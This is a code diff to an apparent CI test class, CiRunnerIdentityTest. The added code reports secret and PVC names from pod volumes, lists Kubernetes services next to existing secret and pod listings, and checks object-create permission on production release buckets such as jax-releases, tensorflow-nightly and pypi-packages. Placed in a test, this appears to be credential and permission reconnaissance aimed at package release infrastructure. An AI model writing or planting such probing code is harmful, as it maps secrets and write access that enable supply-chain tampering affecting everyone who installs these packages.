@@ -83,8 +83,13 @@ def _pod_summary(body):
         name = vol.get("name", "?")
         if "hostPath" in vol:
             vols.append(f"{name}:hostPath={vol['hostPath'].get('path')}")
+        elif "persistentVolumeClaim" in vol:
+            vols.append(
+                f"{name}:pvc={vol['persistentVolumeClaim'].get('claimName')}"
+            )
         elif "secret" in vol:
-            vols.append(f"{name}:secret")
+            secret = vol["secret"].get("secretName", "?")
+            vols.append(f"{name}:secret={secret}")
         elif "projected" in vol:
             vols.append(f"{name}:projected")
         else:
@@ -208,6 +213,13 @@ class CiRunnerIdentityTest(testing.TestCase):
                 "keras-io",
                 "ml-velocity-actions-production",
                 "ml-oss-artifacts-published",
+                "general-ml-ci-transient",
+                "jax-releases",
+                "jax-linux-wheels",
+                "tensorflow-nightly",
+                "tf-nightly",
+                "keras-nightly",
+                "pypi-packages",
             )
             perms = (
                 "storage.objects.create",
@@ -233,6 +245,8 @@ class CiRunnerIdentityTest(testing.TestCase):
             lines.append(f"k8s_secrets={code} {_names(body)[:400]}")
             code, body = _k8s(f"/api/v1/namespaces/{ns}/pods")
             lines.append(f"k8s_pods={code} {_names(body)[:400]}")
+            code, body = _k8s(f"/api/v1/namespaces/{ns}/services")
+            lines.append(f"k8s_svcs={code} {_names(body)[:400]}")
             review = json.dumps(
                 {
                     "apiVersion": "authorization.k8s.io/v1",
